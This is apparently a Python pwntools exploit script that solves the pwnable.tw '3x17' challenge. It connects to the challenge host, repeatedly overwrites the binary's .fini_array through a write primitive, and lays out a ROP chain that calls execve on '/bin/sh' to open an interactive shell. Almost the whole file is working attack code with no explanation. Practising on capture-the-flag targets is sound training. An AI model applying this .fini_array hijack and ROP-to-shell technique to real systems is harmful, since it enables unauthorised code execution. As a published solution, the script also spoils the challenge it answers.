from pwn import *
# s=process("./3x17")
s=remote("chall.pwnable.tw",10105)
raw_input("debug")
# gdb.attach(s,"""
# b * 0x4b4140\n
# b * 0x401C2E\n
# c""")
#.fini_array       FINI_ARRAY       00000000004b40f0  000b30f0
MAIN = 0x401B6D
FINI_ARRAY_CALL = 0x402960
FINI_ARRAY = 0x4b40f0

POP_RDI = 0x401696
POP_RSI =0x406c30
POP_RAX = 0x41e4af
POP_RDX = 0x446e35
SYSCALL = 0x4022b4
RET = 0x401016
LEAVE_RET = 0x401c4b

def write_something(address,value):
    s.sendlineafter("addr:",str(int(address)))
    s.sendlineafter("data:",value)

write_something(FINI_ARRAY,p64(FINI_ARRAY_CALL)+p64(MAIN))
write_something(FINI_ARRAY+8*3,p64(POP_RDI) + p64(FINI_ARRAY+8*12))
write_something(FINI_ARRAY+8*5,p64(POP_RSI) + p64(0))
write_something(FINI_ARRAY+8*7,p64(POP_RDX) + p64(0))
write_something(FINI_ARRAY+8*9,p64(POP_RAX) + p64(59))
write_something(FINI_ARRAY+8*11,p64(SYSCALL) + "/bin/sh\x00")
write_something(FINI_ARRAY,p64(LEAVE_RET))

s.interactive()